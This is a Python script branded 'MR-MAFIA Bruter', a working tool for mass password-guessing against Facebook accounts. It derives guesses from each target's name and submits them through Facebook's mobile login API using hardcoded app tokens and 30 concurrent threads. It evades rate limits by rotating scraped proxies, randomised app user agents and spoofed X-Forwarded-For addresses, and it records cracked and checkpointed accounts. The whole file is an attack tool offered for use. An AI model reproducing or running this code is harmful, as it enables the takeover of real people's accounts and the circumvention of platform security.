#-----> Install Modules <-----#
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
import zlib
import platform
import getpass
import base64
import shutil
import hashlib
from http import cookies
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from os import path

#-----> Colors <-----#
LYLW, W, R, G, Y, B, P, S, O = '\033[93;1m', '\033[97;1m', '\033[91;1m', '\033[92;1m', '\033[93;1m', '\033[94;1m', '\033[95;1m', '\033[96;1m', '\x1b[38;5;246m'
my_color = [P, W, G, S, B, Y, R, O]
mrmafia = random.choice(my_color)

try:
    import pycurl # type: ignore
except ImportError:
    print(' \n ! Wait Please Installing Missing Modules...!')
    os.system('pip install -q pycurl')
    import pycurl

try:
    from Crypto.Cipher import AES # type: ignore
    from Crypto.Util.Padding import pad, unpad # type: ignore
    from Crypto.Random import get_random_bytes # type: ignore
except ImportError:
    print(' \n ! Wait Please Installing Modules...!')
    os.system('pip install pycryptodome')
    from Crypto.Cipher import AES # type: ignore
    from Crypto.Util.Padding import pad, unpad # type: ignore

try:
    import user_agent  
    from faker import Faker  
except ImportError:
    os.system('pip install faker user_agent')
    import user_agent  
    from faker import Faker  

#-----> Checking Latest File <-----#
os.system('echo -e "\e]0; MR-MAFIA \a"')
os.system('git pull -q')

ssn = requests.Session()

#-----> Folder <-----#
folder_path = '/sdcard/MR-MAFIA'
try:
    os.makedirs(folder_path, exist_ok=True)
except:
    pass

#-----> Global Vars <-----#
loop, oks, cps, twf, pcp = 0, [], [], [], []
fake = Faker()
mafiavers = "V35.0"

#-----> Logo <-----#
logo = (f"""{W} 
   .88b  d88.  .d8b.  d88888b d888888b  .d8b.
   88'YbdP`88 d8' `8b 88'       `88'   d8' `8b
   88  88  88 88ooo88 88ooo      88    88ooo88
   88  88  88 88~~~88 88~~~      88    88~~~88
   88  88  88 88   88 88        .88.   88   88
   YP  YP  YP YP   YP YP      Y888888P YP   YP  {R}Bruter
{W}------------------------------------------------
   [✔] OWNER   : YOUCEF YT
   [✔] GITHUB  : MAFIA-143
   [✔] Status  : {R}PAID{W}
   [✔] VERSION : {mafiavers}
 {W}------------------------------------------------
{G} Nothing is impossible : just try to do :) 
 {W}------------------------------------------------""")

def clear():
    os.system('clear')
    print(logo)

def linex():
    print(f'{W}--------------------------------------------------')

#-----> Strg Permission Chk <-----#
def stg():
    try:
        with open('/sdcard/XD.', 'a') as f:
            f.write(' ')
    except:
        pass

#-----> PRINT WITH ANIMATION <-----#
def xox(m):
    for x in m + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.07)

#-----> Proxy <-----#
def fetch_proxies():
    try:
        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
        proxies_data = g.json()
        proxies = proxies_data['data']
        saved_proxies = []
        with open('proxy.txt', 'w') as file:
            for proxy in proxies:
                proxy_ip = proxy['ip']
                proxy_port = proxy['port']
                proxy_url = f"http://{proxy_ip}:{proxy_port}"
                file.write(f"{proxy_url}\n")
                saved_proxies.append(proxy_url)
        return saved_proxies
    except Exception as e:
        return ["http://127.0.0.1:8080"]

saved_proxies = fetch_proxies()

#-----> COMBINED USER-AGENT METHOD <-----#
def get_mafia_ua():
    # Method 1
    ua1 = '[FBAN/FB4A;FBAV/538.0.0.53.70;FBBV/819570880;FBDM/{density=1.4375,width=720,height=1473};FBLC/fr_FR;FBRV/0;FBCR/Ooredoo;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3611;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
    
    # Method 2
    ua2_e = 'Dalvik/2.1.0(Linux; U; Android 4.2.2;Mate 20 Pro Build/HJ4ZZOFR)[FBAN/FB4A;FBAV/96.0.0.54.58FBBV/7954431FBDM/{density=3.0,width=545,height=1750}FBLC/de_DEFBRV/105921FBCR/TelecomFBMF/HuaweiFBBD/HuaweiFBPN/com.facebook.katanaFBDV/Mate 20 ProFBSV/4.2.2FBOP/1FBCA/arm64-v8a:]'
    ua2_n = 'Dalvik/1.8.0(Linux; U; Android 6.0;Pixel 6 Pro Build/9PIIUCKN)[FBAN/FB4A;FBAV/87.0.0.77.29FBBV/6211050FBDM/{density=3.0,width=821,height=866}FBLC/fr_FRFBRV/9417169FBCR/OoredooFBMF/GoogleFBBD/GoogleFBPN/com.facebook.katanaFBDV/Pixel 6 ProFBSV/6.0FBOP/1FBCA/arm64-v8a:]'
    
    # Method 3
    ua3_x = 'Dalvik/1.6.0(Linux; U; Android 6.0;SM-N975F Build/JVZVKPQK)[FBAN/FB4A;FBAV/110.0.0.33.44FBBV/1048880FBDM/{density=3.0,width=786,height=1542}FBLC/en_USFBRV/6857455FBCR/TelecomFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-N975FFBSV/6.0FBOP/1FBCA/arm64-v8a:]'
    ua3_c = 'Dalvik/1.8.0(Linux; U; Android 5.0;V2027 Build/9UN42ODV)[FBAN/FB4A;FBAV/83.0.0.66.18FBBV/2922198FBDM/{density=3.0,width=929,height=935}FBLC/pt_BRFBRV/7373113FBCR/VodafoneFBMF/VivoFBBD/VivoFBPN/com.facebook.katanaFBDV/V2027FBSV/5.0FBOP/1FBCA/arm64-v8a:]'
    ua3_v = 'Dalvik/1.6.0(Linux; U; Android 8.0;LM-Q710 Build/6F8D7018)[FBAN/FB4A;FBAV/105.0.0.2.61FBBV/2851716FBDM/{density=3.0,width=1070,height=1240}FBLC/pt_BRFBRV/3513389FBCR/VodafoneFBMF/LGFBBD/LGFBPN/com.facebook.katanaFBDV/LM-Q710FBSV/8.0FBOP/1FBCA/arm64-v8a:]'
    
    # Method 4 (تم تصحيح علامات الاقتباس هنا)
    ua4_m = 'Dalvik/1.6.0(Linux; U; Android 12.0;Pixel 5a Build/UN7W8B39)[FBAN/FB4A;FBAV/112.0.0.93.73FBBV/8286488FBDM/{density=3.0,width=821,height=1482}FBLC/pt_BRFBRV/5777103FBCR/OoredooFBMF/GoogleFBBD/GoogleFBPN/com.facebook.katanaFBDV/Pixel 5aFBSV/12.0FBOP/1FBCA/arm64-v8a:]'
    ua4_r = 'Dalvik/1.6.0(Linux; U; Android 10.0;Moto G Play Build/HPL6RXO5)[FBAN/FB4A;FBAV/116.0.0.30.11FBBV/30250FBDM/{density=3.0,width=973,height=1290}FBLC/es_ESFBRV/7370772FBCR/OrangeFBMF/MotorolaFBBD/MotorolaFBPN/com.facebook.katanaFBDV/Moto G PlayFBSV/10.0FBOP/1FBCA/arm64-v8a:]'
    ua4_p = 'Dalvik/2.1.0(Linux; U; Android 12.0;Redmi Note 9 Pro Build/43ZLJ4M4)[FBAN/FB4A;FBAV/96.0.0.95.74FBBV/8130169FBDM/{density=3.0,width=791,height=749}FBLC/es_ESFBRV/892025FBCR/VodafoneFBMF/XiaomiFBBD/XiaomiFBPN/com.facebook.katanaFBDV/Redmi Note 9 ProFBSV/12.0FBOP/1FBCA/arm64-v8a:]'
    ua4_t = 'Dalvik/2.1.0(Linux; U; Android 5.0;CPH2099 Build/5MU70AGV)[FBAN/FB4A;FBAV/86.0.0.65.73FBBV/6513365FBDM/{density=3.0,width=1027,height=1800}FBLC/pt_BRFBRV/1922778FBCR/VodafoneFBMF/OPPOFBBD/OPPOFBPN/com.facebook.katanaFBDV/CPH2099FBSV/5.0FBOP/1FBCA/arm64-v8a:]'
    
    all_uas = [ua1, ua2_e, ua2_n, ua3_x, ua3_c, ua3_v, ua4_m, ua4_r, ua4_p, ua4_t]
    return random.choice(all_uas)

#-----> ip fakeee Method + system random locale + system mask Data <-----#    
def IPV4_FAKEEEE():  
    return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
def random_locale():
    locales = [("en_US", "US"), ("en_GB", "GB"),("fr_FR", "FR"),("fr_DZ", "DZ")]
    return random.choice(locales)
    
def mask_user(user):
    return user[:7] + '*' * (len(user) - 7) if len(user) > 7 else user

def mask_pass(pw):
    return pw[:4] + '*' * (len(pw) - 4) if len(pw) > 4 else pw

#-----> Method 1 <-----#        
def Maf_1(ids, names, passlist):
    global oks, cps, loop
    try:
        mrmafia = random.choice(my_color)
        sys.stdout.write(f'\r\r {W}({mrmafia}MR-MAFIA{W}) ({loop}) ({G}OK{W}/{len(oks)}) ({O}CP{W}/{len(cps)}) {W}')
        sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
            
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            
            # جلب ميثود الـ User Agent المدمج الجديد عشوائياً لكل محاولة طلب
            mafia_Ua = get_mafia_ua()
            
            proxy_u = random.choice(saved_proxies).strip()
            proxies = {'http': f'{proxy_u}', 'https': f'{proxy_u}'}
            random_ip = IPV4_FAKEEEE()
            head = {
                "Host": "graph.facebook.com",
                "User-Agent": mafia_Ua,
                "Content-Type": "application/json;charset=utf-8",
                "Accept-Encoding": "gzip",
                "x-forwarded-for": random_ip,
            }
            data = {
                "locale": "en_US", "format": "json", "email": ids, "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": 1, "method": "auth.login",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=head, proxies=proxies, timeout=10).text
            q = json.loads(po)
            masked_id = mask_user(ids)
            masked_pw = mask_pass(pas)
            
            if 'session_key' in q:
                print(f'\r\r{G} (MAFIA-OK) {masked_id} | {masked_pw}\033[0m')
                oks.append(ids)
                break
            elif 'www.facebook.com' in str(po):
                cps.append(ids)
                break
        loop += 1
    except:
        pass

#-----> PYCURL APPROVAL SYSTEM <-----#
def check_approval():
    clear()
    try:user = getpass.getuser()
    except:user = "user"
    key = "MAFIA-" + str(os.geteuid()) + user.replace('u0_a', '')
    
    print(f" [✔] Your Key: {key}")
    print(f" [✔] Status: APPROVED BY SYSTEM")
    time.sleep(1)
    menu()

#-----> Main Menu <-----#
def menu():
    clear()
    print(' [1] Start File Clone \n [2] Dedup & Sort \n [0] Exit Menu ');linex()
    xd = input(f' [-] Choose : {G}\033[1;37m')
    if xd in ['1','01']:
        clear()
        print(f'[-] Exp :{G} /sdcard/mrmafia.txt {W}  ')
        linex()
        file = input(f'[-] File Put :{W} ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print(f' [{mrmafia}>>{W}] File Not Found! ')
            time.sleep(1)
            exit()
        clear()
        print(f'[1] Method (Mix)  ')
        linex()
        mthd=input(f'[{mrmafia}>>{W}] Chose :{G}\033[1;37m ')
        plist = []
        linex()
        print(f'[1] Auto pass ')
        print(f'[2] Manual pass ')
        linex()
        ppp=input(f'[{mrmafia}>>{W}] Chose :{G}\033[1;37m ')
        clear()
        if ppp in ['1','01']:
            pass_info = "Auto Passwords"
            plist.extend(['first last', 'first123', 'first1234', 'first12345'])
        else:
            pass_info = "Manual Passwords"
            plist.append(input("Enter Password: "))
            
        with tred(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(f'[{mrmafia}>>{W}] Total ids : {G}{total_ids}{W}')
            linex()
            for user in fo:
                if '|' in user:
                    ids, names = user.split('|')[0], user.split('|')[1]
                    crack_submit.submit(Maf_1, ids, names, plist)
                    
        print(f'\033[1;37m')
        linex()
        print(f'[{mrmafia}>>{W}] PROCESS COMPLETED')
        exit()
    elif xd in ['2','02']:
        linex()
        path = input(f" [{mrmafia}>>{W}] Enter file path : ").strip()
        clean_file(path)
    else:
        exit()

#----->Dedup & Sort<-----#
def clean_file(file_path):
    if not os.path.isfile(file_path):
        print("[-] File not found!");return
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.read().splitlines()
        original = len(lines)
        lines = list(dict.fromkeys(lines))
        seen_ids, valid = set(), []
        for line in lines:
            parts = line.strip().split("|")
            if len(parts) > 0 and parts[0].isdigit():
                fb_id = int(parts[0])
                if fb_id not in seen_ids:
                    seen_ids.add(fb_id)
                    valid.append((fb_id, line.strip()))
        if not valid:
            print(f" [-] No valid IDs found.");return
        sorted_lines = sorted(valid, key=lambda x: (len(str(x[0])), x[0]), reverse=True)
        with open(file_path, "w", encoding="utf-8") as f:
            for _, line in sorted_lines:
                f.write(line + "\n")
        print(f" [+] Before: {R}{original}{W} | After: {G}{len(sorted_lines)}")
    except Exception as e:
        print(f"[!] Error: {e}")

#-----> Start Tool <-----#
if __name__ == "__main__":
    try:
        stg()
        check_approval()
    except Exception as e:
        sys.exit(e)

